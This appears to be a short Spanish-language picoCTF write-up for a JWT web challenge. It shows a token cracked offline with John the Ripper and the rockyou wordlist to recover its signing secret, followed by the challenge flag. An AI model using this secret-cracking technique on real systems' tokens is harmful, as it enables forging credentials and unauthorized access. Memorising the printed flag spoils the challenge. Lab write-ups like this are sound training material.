## Descripción 
Check the admin scratchpad!

[http://fickle-tempest.picoctf.net:52576](http://fickle-tempest.picoctf.net:52576)
## Solución 
```
└─$ nano jwt
                                                                             
┌──(kali㉿kali)-[~]
└─$ cat jwt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiSm9obiJ9.K1Omo0Gk5saKwJTkkgT7PUZohD7USknEE0lmT2AYAiM
                                                                             
┌──(kali㉿kali)-[~]
└─$ john jwt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:02 DONE (2026-09-14 13:28) 0.4184g/s 3094Kp/s 3094Kc/s 3094KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
## Notas adicionales 
* Tener kali es una herramienta muy necesaria para este tipo de retos web 
* Solo en kali se encontraran de forma sencilla los archivos o programas necesarios 
## Referencias
* https://www.jwt.io/